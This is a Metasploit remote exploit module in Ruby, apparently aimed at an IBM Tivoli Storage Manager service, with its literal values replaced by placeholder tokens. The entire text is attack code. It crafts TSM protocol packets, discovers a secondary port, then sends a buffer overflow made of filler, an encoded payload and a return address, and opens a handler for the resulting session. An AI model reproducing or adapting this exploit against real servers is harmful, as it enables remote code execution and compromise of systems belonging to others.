require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GreatRanking include Msf :: Exploit :: Remote :: Tcp def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , } , <str> = > true , <str> = > { <str> = > ( ( <int> * <int> ) + <int> ) , <str> = > <str> , <str> = > - <int> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] , ] , <str> = > <int> , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) ] , self . class ) end def make_tsm_packet ( op , data ) pkt = <str> if op > <hex> pkt << [ <int> , <int> , <hex> , op , <hex> + data . length ] . pack ( <str> ) else pkt << [ data . length , op , <hex> ] . pack ( <str> ) end pkt << data end def explode_tsm_packet ( buf ) return nil if buf . length < <int> len , op , magic = buf [ <int> , <int> ] . unpack ( <str> ) return nil if magic != <hex> if op == <hex> return nil if buf . length < <int> op , len = buf [ <int> , <int> ] . unpack ( <str> ) data = buf [ <int> , len ] else data = buf [ <int> , len ] end return op , data end def extract_port ( buf ) op , data = explode_tsm_packet ( buf ) if op != <hex> print_error ( <str> % op ) return nil end if data . length < <int> print_error ( <str> ) return nil end port_str_len = data [ <int> , <int> ] . unpack ( <str> ) [ <int> ] if data . length < ( <int> + port_str_len ) print_error ( <str> ) return nil end data [ <int> , port_str_len ] . unpack ( <str> ) . pack ( <str> ) . to_i end def exploit print_status ( <str> % target . name ) query = [ <int> ] . pack ( <str> ) query << <str> * <int> data = make_tsm_packet ( <hex> , query ) connect print_status ( <str> ) sock . put ( data ) buf = sock . get_once ( - <int> , <int> ) disconnect rca_port = extract_port ( buf ) if not rca_port or rca_port == <int> print_error ( <str> ) else print_status ( <str> % rca_port ) end copy_len = payload_space + <int> sploit = rand_text ( <int> ) sploit [ <int> , <int> ] = [ <int> , copy_len ] . pack ( <str> ) buf = payload . encoded buf << [ target . ret ] . pack ( <str> ) . unpack ( <str> ) . pack ( <str> ) sploit << buf data = make_tsm_packet ( <hex> , sploit ) connect ( true , { <str> = > rca_port } ) print_status ( <str> ) sock . write ( data ) print_status ( <str> ) handler disconnect end end 
